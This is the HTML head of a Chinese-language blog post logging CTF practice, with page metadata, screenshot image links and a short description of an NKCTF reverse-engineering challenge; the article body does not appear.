<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Juana_2u">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://juana-2u.github.io/2023/09/13/刷题记录/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="NKCTF20230318PKMF题目描述：flag格式为nkctf{xxx}，flag全小写字母，中间的xxx为nkctf文件中写入的十六进制内容直接进入主函数查看，这是简单整理后的主函数的样子，标上了一些比较显眼的变量和一些注释。    通过大体浏览后知道最后的“Congratulations! you found it!\n”是我们需要的最终结果，所以前面不能使程序退出。ReadFile函数">
<meta property="og:type" content="article">
<meta property="og:title" content="刷题记录">
<meta property="og:url" content="https://juana-2u.github.io/2023/09/13/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="NKCTF20230318PKMF题目描述：flag格式为nkctf{xxx}，flag全小写字母，中间的xxx为nkctf文件中写入的十六进制内容直接进入主函数查看，这是简单整理后的主函数的样子，标上了一些比较显眼的变量和一些注释。    通过大体浏览后知道最后的“Congratulations! you found it!\n”是我们需要的最终结果，所以前面不能使程序退出。ReadFile函数">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1680016194354-5acf3de7-44a7-4845-bc70-9dc959b203db.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1680016222684-73dc3bc6-fa4f-4274-84de-12e34ac7e8b3.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1680016248582-086abeb8-e51c-4f93-8ad1-32b37b3b9d27.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1680017946667-566df722-3daa-4300-8d18-9f0b55e69d59.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1680018030630-5eae6acc-261e-4922-9018-d5031089879d.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681820255179-fd5b0100-eb51-458c-8b89-7c6245395d96.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681387669789-d531d758-1613-4374-b0fa-34ac942de123.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681387794231-3cf55ef5-c561-4f94-9379-4a3bd5e6d426.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681388197504-58b2fddf-ba1f-4a53-b40a-fdda82175202.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681388244869-3767b3f8-188f-4c68-bf99-0e0427084ef3.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681388309249-d126b2a2-50d9-4400-8156-4bb3a33b6fbe.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681390515436-78837483-4443-4bc8-b766-ac8f1a43a215.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681537591631-288e8a81-1be4-479e-9791-e32ff7368ef9.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681538025106-3f33f9bf-d93f-41b6-9802-fa97ba2bc659.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681539824669-62456b75-dac2-4f38-8fc4-2a464ea1c21e.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681540707194-721297a9-68bf-4b93-8bab-6d7b5a926106.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681540749100-142f0174-8057-404a-a124-2e602ed8f2c2.jpeg">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681540912161-481ecd58-fb69-4500-9b51-1b82af9bb6ab.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681555655997-7bfb4b74-17fc-46bd-be51-404b6a34114c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681553621822-e17a2b26-e615-41ca-b2be-12b49ff7c29f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681553690818-5fccf4f1-24bd-4513-bb0d-2922dd5f0b24.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681554012163-4de2fa74-465e-4c60-9155-74b429ed66a4.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681554075656-b392fc08-b198-453d-97cc-679c6af46097.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681554122591-4b7c66a4-8f27-478c-99a4-dc6861d454a2.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681554182408-b3dfa132-732b-4b36-a38f-27cbc8aa0321.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681549221746-300062d3-eb60-4182-968c-cd5ec1824cd1.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681549290571-310a7949-b7d9-43ff-9035-1f53b12e01eb.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681561295863-eef13c47-cdfd-4f0d-8b70-e06063721c56.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681555194523-9b391741-4a1f-424b-920b-f1051b16d8d0.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1681555208977-9e8b86cf-3c72-45e2-8971-9e00a99ec318.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679286223360-32e3f38d-0e71-4928-98ba-37521fdc5499.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1678885012036-dff6e635-27d5-447f-84e9-09b8702cb95b.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1678885208244-d939b146-0f51-402c-98b7-d795f4b08f7a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679035809354-e4f7ca1b-b090-48bf-9bd8-5df93a382bff.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679155552698-9dad6849-b7d0-4e31-bf82-6e922e993327.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679124866042-5180b5d9-c2d9-4309-afa4-53a5489c2139.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679125531025-a4c72ff8-745f-49e5-9a6e-0b281a509b0f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679125482046-77c364f2-367a-4bc1-a779-60e2a1d1c8d8.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679130554161-64b9240b-583a-467d-9d5e-5a7545fab497.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679126259510-e569c16f-c993-4664-8bde-d1cd0afa84f0.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679133005708-6ad152b4-8443-4688-9f72-277060412ea3.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679133581939-3fcaac42-ec7b-400a-ae6c-ab18721f5414.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679151525094-72abd0f4-f580-4518-a268-530d67d5ba38.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679151545151-66e1995c-fca6-4faf-a8d1-8674a12046f1.png#averageHue=%23fbfbfb&clientId=uf8617578-b3d4-4&from=paste&height=329&id=u3a277fd3&originHeight=329&originWidth=936&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15392&status=done&style=none&taskId=udb9a3083-83c1-4727-abb3-0414f34f5f1&title=&width=936">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679144772466-2a1d9bae-3429-43e1-9eea-22a4194d4af3.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679151607603-fc987ea8-8d6d-4d7e-8902-3ca0208557d5.png#averageHue=%23f6f5f5&clientId=uf8617578-b3d4-4&from=paste&height=118&id=u3d96c68c&originHeight=149&originWidth=408&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8606&status=done&style=none&taskId=ua1426408-8826-4a48-90ad-2ef526f7091&title=&width=322">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679153347949-a0a038cb-e35f-4208-9476-973520044f00.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679153394509-a5a481b0-a67a-4b72-b43e-69baa28c025f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679203253429-9ef95644-14f6-4dce-82ee-9052b5345752.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679203296153-9448ac4e-3e3f-4c0a-acf4-948834a64b58.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679203362994-e11139be-1877-41ab-a328-edb92a782d36.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679203406754-ed1ad3f4-288c-4e5b-9bd0-180d0012f7ce.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679206435474-560e5556-05f1-49d9-ae97-c83ac362a23b.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679210071031-c16cbeea-4821-4ce1-a2bf-38dd3c6222c2.png#averageHue=%23c6fcfc&clientId=u04c7bf77-de30-4&from=paste&height=358&id=u099d9675&originHeight=447&originWidth=1146&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39356&status=done&style=none&taskId=uc38dc458-f4e0-41ad-a9d4-08c0f578fba&title=&width=916.8">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679206241029-435ac6ca-f9e7-49b6-bd93-7eb3c022bb63.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679206299896-4945de50-86d4-4a25-a7cf-3c49ae00a192.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679218710670-e4bd5340-845b-4104-b4f7-12beea8eb9bc.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679223727944-617580b0-5618-494c-98b1-6682adb9cab2.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679224018583-bc3b0421-133c-4fb5-a29e-8f37c7de95cf.png#averageHue=#fbfbfa&from=url&height=215&id=TyDKf&originHeight=278&originWidth=535&originalType=binary&ratio=1.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679223906778-c8d9975e-72a4-4237-afd3-cd392b01671c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679224247008-a057a2f4-9c12-41b4-94e9-ad4022d94adc.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679224751361-a3c38368-925a-4dc0-8c7b-e2d5ebf460d0.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679225078456-cc75da29-2ce6-46f3-b296-0deba0200d22.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679223414984-d835d193-b773-4a81-8343-cc8ee68a7440.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1679223396535-07cf01f7-57a2-4a33-9799-cfd8a5a79fdc.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1682255615337-bd105eba-980a-4158-890d-e721ec60729f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1682338613814-1d38cf94-03b0-4ad6-ab6d-85828642e938.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660583388411-2e1471b1-721e-4d13-8aee-4d29e341b472.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660583449036-3039420c-436b-4fba-aa26-f16e37ddb00c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660583583458-f4f7d11f-3591-41b8-a895-2e64083692a7.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660583703521-8698f2cf-087a-4283-878f-23613ca83c6e.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660584129715-93028ff3-2ef6-4175-a8f9-0925fa864af7.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660584161777-7f310b00-abff-4350-9aea-51377d2b4ed6.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660624960261-24daf645-97c1-4182-b1a8-59ce28427d99.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660626452013-74060c5b-6cae-41cf-9834-e0b5bd9910ac.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660627462259-9c6039ad-9e8f-4967-8267-57dc1d6ac25b.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660627689419-42530de1-7178-4327-b583-e77208492da8.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660627796623-52ea9056-c3e4-4d28-abd0-1d28412ad0a7.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660631085830-205662b2-b12f-45d5-919d-bc369eb19948.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660632460668-c1e539da-9a06-4304-b349-3e8c5b8ea2a5.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660631233178-95c6811d-ad93-446f-9ce4-6aafcf398032.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660633716870-4810a12e-0eee-4ba3-b2a2-5e6307033f4d.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660636948745-11b281e6-bf10-4e49-abdc-9b342501d5ab.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660637182839-70c11767-49f7-4b46-b4ed-ee35948d7798.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660637229694-cf68381f-e725-4116-a677-003e9e812d19.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660637407990-1b73cba3-08de-4b20-b2d8-9d5d4dacca2c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660638196822-e6b98b6e-c415-46de-882d-31d63bac0cda.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660638265034-5e4ee26e-bc46-40e8-bda7-223bd31a31f6.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660640584675-d4a4e630-7d8a-45e2-aa8b-5c6305f3ad10.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660641981806-dc2ec121-2f4d-40a9-9031-97eb943f706a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660642237255-3e0e7883-553f-43ca-bd7c-3b9c313be3ba.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660705341952-f31e9d73-ba84-400d-8af4-a0915c4b521b.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660725669019-b2e2bcdc-904f-4cc8-8114-81328924e8ed.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660727742861-e3ca20f3-f5ab-4781-a3c9-6392c0c14d61.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660728087096-1378b977-0e1a-4067-97a4-cbac5b907c0f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660728280391-f07f0e0d-e4ff-44e7-a377-9c164e2165b7.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660728374275-40e54880-9a28-4f50-8424-0d0c045162b0.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660736091210-01c2540f-4323-4edd-93d1-8d0b1e36ea3f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660737295297-c4422e92-58e1-4708-9ac7-37f5dd370d1a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660736675159-7086e6db-af35-4343-86af-edd69302d3f5.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660738802756-ed4ad7fb-c542-41ed-bc08-c3dd1e1600dd.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660742382123-1c6255cb-cb0b-4ea5-8dca-737db68c4864.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660739278716-3248d691-8e2e-44be-a4c7-1eb4c9e140b4.jpeg">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660742651235-6cb60dad-ea6b-4c54-b8e5-080f99c32063.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660743067803-ada2a14e-f2c5-4d27-a0ef-da4f9d176e78.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660743953945-e912c048-704f-4194-bffd-f0fd506aa4ac.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660744056515-df816ad1-fa1c-4137-ac34-4c53b0015deb.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660744315612-371d384f-4306-4c4a-bd77-d7f44f0b3341.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660746438081-50948afa-68fc-413d-b2da-dee68857031e.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660747151866-2d4c8d7b-1ea0-4a74-914d-09e2844f5dac.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660747161841-44ac763c-c575-43e4-850f-5700aea0bdee.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660747426882-ca829c24-bab5-4c41-a7fb-fcee775e26df.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660750782017-0ab563df-7b5e-4486-845f-4cd3d885f4a0.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660831214387-44f4f351-dd45-43d9-9c32-0258bb14b76b.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660751414871-8ddb2d6f-857a-4889-bc17-bafbf23484be.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660835185005-6dfde773-8d0e-4424-83d5-7c98061c901d.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660833119509-5f53c884-449b-475b-b8d8-a8a5490ea4be.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660838644523-e94c85ba-9bae-4563-ae34-ec371d5285d8.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660839488648-c322e1be-0564-4e68-a7c7-676f8f7f1440.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661067640492-4540f0cf-a5e4-4311-b277-eafac62d8df8.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661068233604-d772ab43-3f2d-44de-8cf5-ee960356b5da.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661586993644-3b05ee3d-beb6-475a-8217-8f2db4555a7b.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661587808535-a3719f18-5454-4607-ad7d-a99ae2e09604.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/23148330/1661598605508-1366a128-eda3-49c4-8e0d-280ac0f8d49f.png#averageHue=%232d2a27&clientId=ud7510f5e-8975-4&from=paste&height=27&id=uc344dada&originHeight=27&originWidth=151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1405&status=done&style=none&taskId=u19f97967-66d4-41d1-8e68-dbfcec0b23b&title=&width=151">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661604312706-8a1afd05-2a8f-4967-bee8-d65f3b25276f.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661605521532-84047949-fc96-41f0-9f0e-4d3138c65e21.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661605532367-8540606a-3405-4321-b360-48ffdf8d79dd.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661605638036-ce804457-ee02-4314-b6ea-a61e117676df.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661654207689-459ff1b9-c676-42ab-b7e6-47a829e672ad.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661702071873-ab533a64-eddd-44c4-8904-60524fcf2f6e.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661758098300-4e6bc0fe-b10f-49ea-8194-6f86053d1a70.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661702243369-25108d63-83b0-4459-9e61-23b61c8f2cb7.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661860855486-768ab726-79f5-4b33-a66d-56e22d7c4f66.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1662214046748-180f4c6d-4904-48f0-a936-a06d4f498dc0.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1662209789496-017a0694-4c4d-40e2-aa32-bfbe789258a8.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1662551734909-cedba906-28e7-4bc1-b45e-1b02cf1b6396.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1662214748813-9558d804-6a29-44fb-8e1d-47fe58b6c37a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661945312814-078d0bf8-107e-4e8a-9a54-00c4b0c0eac7.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661938137722-6dd547ee-bb01-431d-9ee3-af3399ee8616.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661916238615-0f1592b7-7827-44c3-9149-01fcc7dbbadb.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661937744017-b5c2e985-0e5c-45c6-b5aa-3dbf1b6fc20a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661937354194-28a9c728-d5b2-454c-8984-da89b413014a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661935336377-a0a88e90-58e5-40ba-b62e-beea3ebae138.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661935357167-28c70bd1-237d-4902-b904-8f9a78d69caa.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1661935299862-de74f8ff-ad7f-470b-8015-2cc2bfb68fa9.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660317261295-a9d084db-52c6-4799-873d-ec1c4fc09fb9.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660552763755-898f4d53-8e93-4968-bca1-dfde31bd9728.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660553049791-5d364ec4-9696-4f26-8980-3f8a0b3c14f2.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660553106148-2687340c-3cba-43ba-b364-38d7332f3472.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660557922955-7a5e5c91-3abb-4717-8db8-b56f15d6f07c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660558027105-1829bbce-c9cf-4cea-a376-9ca142232f71.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660558348423-4c023006-31a9-46b4-ae9c-d22ed8ad89fa.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660558290673-81d4be09-ff39-4758-9569-38a57dcb7ff4.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660558263592-227951cc-b1b1-48d4-8f1f-54cfa66bea5a.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660554925033-7f3d9ed9-2386-48dc-96be-e83f90f1a97d.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660554967415-ba6d10fb-6577-4536-a963-b66d14676d2c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660554993745-b72a5036-0af1-43b0-9fd3-34aa4654e43c.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660555141806-aeb289a2-9358-4c6b-899d-37e306592fe6.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660555350775-76c965fd-9f1e-4c10-858b-6664943535d9.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660555547966-edff6b98-ca32-469c-872d-1479aade21b9.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660556172388-ac6b23d2-457c-4087-8955-976a8eda8a73.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660556206833-2abb5daa-bc47-4de7-b87d-6184172fe349.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660556611682-e0511f08-1d12-4e17-848f-c4bf68c22139.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660556886626-135a484c-b34a-4d01-aa9b-d470b5655e76.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660557132199-c2f02aed-2fac-4abe-90d7-280fda222983.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660557611328-2be8b50d-6c6b-48e1-86f5-7398bea14fa3.png">
<meta property="og:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1660557675740-bce894b4-bd76-41b0-8aa1-359b407f1ae1.png">
<meta property="article:published_time" content="2023-09-13T13:29:43.000Z">
<meta property="article:modified_time" content="2023-10-14T03:43:16.176Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ctf_Replay">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://juana-2u.github.io/Post_images/NKCTF-20230328.assets/1680016194354-5acf3de7-44a7-4845-bc70-9dc959b203db.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/ico.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/ico.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/ico.png">
    <!--- Page Info-->
    
    <title>
        
            刷题记录 -
        
        Juana_2u
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"juana-2u.github.io","root":"/","language":"en"};
